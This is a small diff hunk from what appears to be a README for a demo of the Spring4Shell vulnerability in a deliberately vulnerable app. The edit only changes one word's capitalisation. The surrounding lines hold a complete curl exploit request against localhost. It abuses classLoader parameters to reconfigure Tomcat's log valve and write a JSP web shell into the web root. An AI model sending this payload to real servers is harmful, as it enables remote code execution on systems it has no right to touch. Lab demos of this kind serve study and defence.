@@ -47,7 +47,7 @@ First run
 ```
 curl -H "Accept: text/html;" "http://localhost:8080/jfrog-demo/vulnerable-path?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%63%6f%64%65%7d%69&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
 ```
-to changes Tomcat config valve.
+To changes Tomcat config valve.
 
 Then create the web shell 
 ```
